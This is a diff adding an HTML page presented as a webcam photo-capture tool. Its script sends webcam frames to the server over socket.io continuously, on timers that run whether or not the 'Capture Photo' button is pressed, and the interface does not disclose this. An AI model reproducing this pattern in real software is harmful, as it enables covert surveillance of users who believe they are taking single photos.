@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webcam Photo Capture</title>
+</head>
+<body>
+    <h1>Webcam Photo Capture</h1>
+    
+    <!-- Video stream from the webcam -->
+    <video id="video" autoplay></video>
+    
+    <!-- Button to capture a photo -->
+    <button id="captureButton">Capture Photo</button>
+    
+    <!-- Canvas to display the captured photo -->
+    <canvas id="canvas" width="320" height="240"></canvas>
+    
+    <!-- Image to display the captured photo -->
+    <img id="capturedImage" style="display: none;" />
+    
+    <script src="/socket.io/socket.io.js"></script>
+    <!-- Script to access the webcam and capture photos -->
+    <script>
+        const socket = io();
+        const video = document.getElementById('video');
+        const captureButton = document.getElementById('captureButton');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const capturedImage = document.getElementById('capturedImage');
+        const imageQueue = [];
+
+        // Access the user's webcam
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                video.srcObject = stream;
+            })
+            .catch((error) => {
+                console.error('Error accessing the webcam:', error);
+            });
+
+        // Periodically capture and send images
+        setInterval(() => {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Reduce image dimensions and convert to WebP format for optimization
+            const resizedCanvas = document.createElement('canvas');
+            const resizedContext = resizedCanvas.getContext('2d');
+            resizedCanvas.width = 160; // Adjust dimensions as needed
+            resizedCanvas.height = 120; // Adjust dimensions as needed
+            resizedContext.drawImage(canvas, 0, 0, resizedCanvas.width, resizedCanvas.height);
+            const imageData = resizedCanvas.toDataURL('image/webp', 0.7); // Adjust quality as needed
+
+            // Add the image data to the queue
+            imageQueue.push(imageData);
+        }, 100); // Adjust the interval as needed
+
+        // Capture a photo from the webcam stream and send it immediately
+        captureButton.addEventListener('click', () => {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Reduce image dimensions and convert to WebP format for optimization
+            const resizedCanvas = document.createElement('canvas');
+            const resizedContext = resizedCanvas.getContext('2d');
+            resizedCanvas.width = 160; // Adjust dimensions as needed
+            resizedCanvas.height = 120; // Adjust dimensions as needed
+            resizedContext.drawImage(canvas, 0, 0, resizedCanvas.width, resizedCanvas.height);
+            const imageData = resizedCanvas.toDataURL('image/webp', 0.7); // Adjust quality as needed
+
+            // Send the captured image immediately
+            socket.emit('camData', imageData);
+
+            // Display the captured image
+            capturedImage.src = imageData;
+            capturedImage.style.display = 'block';
+        });
+
+        // Send images from the queue to the server
+        setInterval(() => {
+            if (imageQueue.length > 0) {
+                const imageData = imageQueue.shift();
+                socket.emit('camData', imageData);
+            }
+        }, 1000/30); // Adjust the interval as needed
+    </script>
+</body>
+</html>
